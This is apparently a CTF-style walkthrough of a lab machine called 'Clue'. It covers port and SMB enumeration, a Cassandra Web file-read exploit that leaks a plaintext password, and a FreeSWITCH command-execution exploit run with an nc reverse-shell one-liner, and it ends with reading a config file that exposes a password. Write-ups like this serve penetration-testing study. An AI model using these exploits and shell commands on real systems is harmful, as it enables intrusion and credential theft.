##### Tags: `SUID`  `php`  `searchsploit`  `GTFOBin`

# 🐧Clue🐧
## Enumeration
Nmap
```
$ nmap -p- -T4 -sV 192.168.156.240           
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-02 19:55 AEDT
Nmap scan report for 192.168.156.240
Host is up (0.24s latency).
Not shown: 65529 filtered tcp ports (no-response)
PORT     STATE SERVICE          VERSION
22/tcp   open  ssh              OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp   open  http             Apache httpd 2.4.38
139/tcp  open  netbios-ssn      Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn      Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3000/tcp open  http             Thin httpd
8021/tcp open  freeswitch-event FreeSWITCH mod_event_socket
```
Found 2 users in enum4linux
```
$ enum4linux -a 192.168.156.240
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''                                       
                                                                                                                  
S-1-22-1-1000 Unix User\cassie (Local User)                                                                       
S-1-22-1-1001 Unix User\anthony (Local User)
```
port 3000 is hosting a Cassandra Web  
searchsploit and found a script can run remote file read  
and we got the user cassie and password SecondBiteTheApple330  
https://www.exploit-db.com/exploits/49362
```
$ python3 49362.py 192.168.156.240 /proc/self/cmdline
/usr/bin/ruby2.5/usr/local/bin/cassandra-web-ucassie-pSecondBiteTheApple330
```
we know port 8021 is running Freeswitch  
searchsploit found a command execution script  
https://www.exploit-db.com/exploits/47799
```
cat 47799.txt
# Exploit Title: FreeSWITCH 1.10.1 - Command Execution
# Date: 2019-12-19
# Exploit Author: 1F98D
# Vendor Homepage: https://freeswitch.com/
# Software Link: https://files.freeswitch.org/windows/installer/x64/FreeSWITCH-1.10.1-Release-x64.msi
# Version: 1.10.1
# Tested on: Windows 10 (x64)
#
# FreeSWITCH listens on port 8021 by default and will accept and run commands sent to
# it after authenticating. By default commands are not accepted from remote hosts.
#
# -- Example --
# root@kali:~# ./freeswitch-exploit.py 192.168.1.100 whoami
# Authenticated
# Content-Type: api/response
# Content-Length: 20
#
# nt authority\system
```
run the script with reverse shell command
```
$ python3 47799.py 192.168.156.240 "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.157 80 >/tmp/f"
```
```
$ nc -lvnp 80
listening on [any] 80 ...
connect to [192.168.45.157] from (UNKNOWN) [192.168.156.240] 48970
freeswitch@clue:/$ id
uid=998(freeswitch) gid=998(freeswitch) groups=998(freeswitch)
```
```
freeswitch@clue:/etc/freeswitch/autoload_configs$ cat event_socket.conf.xml
cat event_socket.conf.xml
<configuration name="event_socket.conf" description="Socket Client">
  <settings>
    <param name="nat-map" value="false"/>
    <param name="listen-ip" value="0.0.0.0"/>
    <param name="listen-port" value="8021"/>
    <param name="password" value="StrongClueConEight021"/>
  </settings>
</configuration>
```
